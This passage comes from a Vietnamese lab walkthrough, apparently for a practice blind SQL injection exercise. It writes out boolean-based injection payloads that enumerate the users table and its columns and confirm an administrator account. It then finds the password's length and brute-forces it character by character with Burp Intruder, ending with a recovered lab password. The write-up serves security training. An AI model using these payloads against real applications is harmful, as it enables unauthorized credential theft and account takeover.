  &rarr; Tồn tại một bảng là bảng users trong CSDL vì hàm COUNT(*) trả về > 0 &rarr; trạng thái đúng.

  Tương tự, ta tạo payload để kiểm tra có cột username và password trong bảng users hay không:

  ```sql
  ' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' and column_name = 'username') > 0--
  ' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' and column_name = 'password') > 0--
  ```

  <img width="1871" height="816" alt="image" src="https://github.com/user-attachments/assets/674bd589-fec4-48c3-832a-ecb3b3e5f7d2" />

  <img width="1873" height="757" alt="image" src="https://github.com/user-attachments/assets/dfcbb22c-f0b5-4c3b-976a-6ada159aa87f" />

  &rarr; Kết quả tồn tại cả hai cột dữ liệu username và password.

  Tạo payload kiểm tra xem có tồn tại một username là administrator hay không:

  ```
  ' AND (SELECT COUNT(*) FROM users WHERE username='administrator') > 0--
  ```

  <img width="1869" height="754" alt="image" src="https://github.com/user-attachments/assets/8b7d68f3-43e2-494c-8f00-aa9ec747a5ed" />

  &rarr; Kết quả tồn tại một username là *administrator*.

  Tiếp tục tạo payload để kiểm tra độ dài password của user administrator:

  <img width="1869" height="756" alt="image" src="https://github.com/user-attachments/assets/b2ffd6cb-a54f-4d74-b3d2-3f5ef30f0c99" />

  <img width="1872" height="752" alt="image" src="https://github.com/user-attachments/assets/90b593c1-8915-4b2c-8cec-c0de11085a58" />

  &rarr; Nhận thấy với <index> là 20, kết quả trả về không có "Welcome Back!" nhưng với payload > 19 trả về "Welcome Back!" &rarr; Độ dài password là 20.

  Tạo payload để dò đoán các ký tự có trong password, sau đó gửi request vào trong công cụ Intruder để brute force:

  ```
  ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 0, 1) = 'a' --
  ```

  Ta sử dụng chế độ Cluster bomb và thêm hai vị trí brute force như dưới, ngoài ra add Grep - Match "Welcome Back!" để nhận biết mỗi ký tự đúng phát hiện được:

  <img width="1868" height="842" alt="image" src="https://github.com/user-attachments/assets/44611af4-beaa-409a-b059-9583d6234918" />

  Kết quả thực hiện brute force:

  <img width="1822" height="631" alt="image" src="https://github.com/user-attachments/assets/0199349c-9a6e-4630-b2c8-a92f3c19a943" />

  &rarr; Thu được password là *rztpsfcg947inknymkik*

  Đăng nhập thành công:

  <img width="1908" height="874" alt="image" src="https://github.com/user-attachments/assets/c9d90518-8a0b-4936-9fc9-c2b129bb56cf" />


  

  


   



  

  







  


  
  



  





  

  

  

  

